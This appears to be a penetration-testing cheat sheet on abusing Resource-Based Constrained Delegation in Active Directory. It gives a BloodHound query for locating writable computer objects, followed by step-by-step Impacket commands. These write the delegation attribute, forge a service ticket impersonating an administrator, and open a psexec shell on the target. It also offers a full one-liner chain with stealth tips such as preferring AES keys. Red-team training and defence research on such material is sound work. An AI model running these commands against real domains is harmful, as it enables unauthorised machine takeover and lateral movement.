**Resource-Based Constrained Delegation (RBCD)** — every computer object carries a "who is allowed to impersonate users to me" list, and if you can write that list on a target you add an account you control and then log into the target as any user — typically a local admin — taking the machine over. That list is the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute; you point it at an account that has an SPN (a service label, usually a throwaway computer account you create), then use S4U2self+S4U2proxy to mint a service ticket impersonating the admin. You can reach this directly whenever you hold write access to that attribute, or via [NTLM relay to LDAP](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md) (Attack 3).

Or in few words: “This resource accepts hops only from these accounts and this can be configured by a user who owns it”.

```
you -> TARGET object: write AllowedToActOnBehalf = ATTACK$
you (ATTACK$) -> KDC: S4U2self + S4U2proxy, be Admin
KDC -> you: service ticket to TARGET as Admin
you -> TARGET: run commands as Admin
```
## Discovery

Find low-privileged principals with `WriteAccountRestrictions` on a computer (BloodHound cypher):

```cypher

MATCH p=(g)-[:WriteAccountRestrictions]->(c:Computer) WHERE g.objectid ENDS WITH "S-1-1-0" OR g.objectid ENDS WITH "-513" OR g.objectid ENDS WITH "S-1-5-11" OR g.objectid ENDS WITH "-515" RETURN p

```

## Exploitation

You control `USER_NAME` (which has `WriteAccountRestrictions` on `TARGET`) and a computer account `COMPUTER_NAME$` (or any account with an SPN).

1. Configure RBCD on `TARGET`.

```bash

rbcd.py 'DOMAIN/USER_NAME' -hashes ':USER_NT_HASH' -delegate-to 'TARGET_NAME$' -delegate-from 'COMPUTER_NAME$' -action write

```

2. Request a Service Ticket impersonating a user with local admin on `TARGET`.

```bash

# -hashes -> NT hash, RC4 encryption (noisier)
# -aesKey -> AES key, AES encryption (stealthier)
getST.py -spn 'cifs/TARGET_FQDN' 'DOMAIN/COMPUTER_NAME$' -aesKey 'COMPUTER_AES_KEY' -impersonate 'ADM_NAME'

```

**Note:** `KDC_ERR_S_PRINCIPAL_UNKNOWN` from `getST.py` can often be fixed by using the target's short name instead of its FQDN. From a plaintext password you can compute the AES key with `Get-KerberosAESKey.ps1` or `aesKrbKeyGen.py`.

3. Use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

```bash

export KRB5CCNAME=ADM_NAME@cifs_TARGET_FQDN.ccache
psexec.py -k -no-pass DOMAIN/ADM_NAME@TARGET_FQDN

```

4. Remove the delegation (cleanup).

```bash

rbcd.py 'DOMAIN/USER_NAME' -hashes ':USER_NT_HASH' -delegate-to 'TARGET_NAME$' -delegate-from 'COMPUTER_NAME$' -action remove

```

Full Impacket one-liner flow (create machine account -> RBCD -> getST -> psexec), then clean up:

```bash

impacket-addcomputer -computer-name 'ATTACK01$' -computer-pass 'Password123!' 'domain.local/username:password' -dc-ip DC_IP
impacket-rbcd -delegate-from 'ATTACK01$' -delegate-to 'TARGET01$' -action write 'domain.local/username:password' -dc-ip DC_IP
impacket-getST -spn 'cifs/TARGET01.domain.local' -impersonate 'Administrator' 'domain.local/ATTACK01$:Password123!' -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_TARGET01.domain.local.ccache
impacket-psexec -k -no-pass domain.local/Administrator@TARGET01.domain.local
# Cleanup
impacket-rbcd -delegate-from 'ATTACK01$' -delegate-to 'TARGET01$' -action remove 'domain.local/username:password'
impacket-addcomputer -computer-name 'ATTACK01$' -delete 'domain.local/username:password'

```

## Caution

Any delegation you configure must be removed during cleanup.

## References

- rbcd.py (Impacket) - https://github.com/fortra/impacket
- Abusing forgotten permissions on computer objects - https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/
